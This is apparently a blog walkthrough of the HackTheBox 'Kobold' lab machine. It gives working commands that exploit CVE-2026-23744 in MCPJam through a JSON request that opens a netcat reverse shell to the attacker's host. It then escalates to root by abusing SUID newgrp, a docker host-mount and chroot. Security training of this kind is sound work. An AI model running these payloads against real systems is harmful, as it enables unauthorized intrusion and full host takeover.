---
title: HackTheBox - Kobold
author: r2cook
categories:
  - HackTheBox
tags:
  - vhost
  - MCPJam
  - CVE-2026-23744
  - PrivEsc
  - newgrp
  - docker
  - chroot-escape
  - group-abuse
render_with_liquid: false
media_subpath: /images/htb/Kobold/
image:
  path: room_image.png
date: 2026-04-20
---
---

> In this walkthrough, we compromise the Hack The Box **Kobold** machine by enumerating exposed services, discovering a vulnerable **MCPJam** instance, exploiting **CVE-2026-23744** to achieve remote code execution, gaining an initial shell as user **ben**, and finally escalating privileges by abusing Docker group access via a **SUID `newgrp` binary**, allowing us to mount the host filesystem and obtain a root shell.

---

## Initial Setup

First, add the target to your hosts file:

```plaintext
10.129.245.50 kobold.htb
```
{: file="/etc/hosts" }

---

## Enumeration

### Full Port Scan

```shell
$ rustscan -a kobold.htb -g
10.129.245.50 -> [22,80,443,3552]

$ nmap -sC -sV -Pn -T4 -p 22,80,443,3552 -oA scan kobold.htb
```
{: .nolineno }

Key findings:

- **22/tcp** → SSH (OpenSSH 9.6)
    
- **80/tcp / 443/tcp** → Nginx web server
    
- **3552/tcp** → Golang HTTP service (custom web app)
    

---

## Web Enumeration (Port 80/443)

![](web80.png){: width="800" height="400" .shadow }

The main website only shows a _"Coming Soon"_ page and does not provide useful attack surface.

However, we discover an email address in the footer:

```
admin@kobold.htb
```

### Subdomain Fuzzing

```shell
ffuf -u https://kobold.htb/FUZZ \
-H "HOST: FUZZ.kobold.htb" \
-w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt \
-ac -c
```
{: .nolineno }

Results:

```
bin                 [Status: 200]
mcp                 [Status: 200]
```

Add them to `/etc/hosts`:

```plaintext
10.129.245.50 kobold.htb bin.kobold.htb mcp.kobold.htb
```
{: file="/etc/hosts" }

---

## Exploiting MCPJam – CVE-2026-23744

Navigating to:

```
mcp.kobold.htb
```

Leads to an **MCPJam dashboard**:

![](mcpjam_vhost.png){: width="800" height="400" .shadow }

Searching for vulnerabilities reveals:

- CVE: [https://nvd.nist.gov/vuln/detail/CVE-2026-23744](https://nvd.nist.gov/vuln/detail/CVE-2026-23744)
    
- PoC: [https://github.com/suljov/CVE-2026-23744-Remote-Code-Execution-POC.git](https://github.com/suljov/CVE-2026-23744-Remote-Code-Execution-POC.git)
    

This vulnerability allows **remote command execution** by abusing the API endpoint.

### Exploit (Reverse Shell)

```shell
curl -k -X POST "https://mcp.kobold.htb/api/mcp/connect" \
  -H "Content-Type: application/json" \
  -d '{
    "serverConfig": {
      "command": "busybox",
      "args": [
        "nc",
        "<YOUR-IP>",
        "9001",
        "-e",
        "/bin/bash"
      ],
      "env": {}
    },
    "serverId": "213j1l3jkljkl3j"
  }'
```
{: .nolineno }

Start a listener:

```shell
nc -lvnp 9001
```
{: .nolineno }

---

## Shell as ben

After triggering the exploit, we receive a shell as user **ben**:

![](shell_as_ben.png){: width="800" height="400" .shadow }

Retrieve the user flag:

```shell
cat /home/ben/user.txt
```
{: .nolineno }

![](cat_user_flag.png){: width="800" height="400" .shadow }

---

## Privilege Escalation

### Step 1: System Enumeration

Running `linpeas.sh` reveals:

- Docker-related network interfaces
    

![](linepease_docker_virtual_network.png){: width="800" height="400" .shadow }

Checking Docker access:

```shell
docker ps
```
{: .nolineno }

![](check_docker_version_and_list_images_denied.png){: width="800" height="400" .shadow }

Result:

```
permission denied
```

Check groups:

```shell
getent group
```
{: .nolineno }

Output:

```
docker:x:111:alice
```

> We are **not** in the Docker group, but user `alice` is. At first, I thought about privesc to `alice`, but the plan changed later.

---

## Step 2: SUID Binary Abuse (`newgrp`)

Search for SUID binaries:

```shell
find / -perm -4000 -type f 2>/dev/null
```
{: .nolineno }

![](find_suid.png){: width="800" height="400" .shadow }

We find:

```
/usr/bin/newgrp
```

### Why this works

- `newgrp` allows switching the current group
    
- It is **SUID root**, meaning it runs with root privileges
    
- If the target group (**docker**) has no password, we can switch into it
    

### Exploit

```shell
newgrp docker
```
{: .nolineno }

Verify:

```shell
id
```
{: .nolineno }

Now we are part of the **docker group**.

---

## Step 3: Docker Privilege Escalation

Now Docker commands work:

```shell
docker ps
```
{: .nolineno }

Example output:

```
4c49dd7bb727   privatebin/nginx-fpm-alpine:2.0.2   ...   bin
```

### Mount Host Filesystem

We run a container as root and mount the host filesystem:

```shell
docker run --rm -it -u 0 --entrypoint sh -v /:/mnt privatebin/nginx-fpm-alpine:2.0.2
```
{: .nolineno }

Now inside container:

```shell
chroot /mnt sh
```
{: .nolineno }

---

## Root Access

Check privileges:

```shell
id
```
{: .nolineno }

Output:

```
uid=0(root) gid=0(root) groups=0(root)
```

![](cat_root_flag.png){: width="800" height="400" .shadow }

---
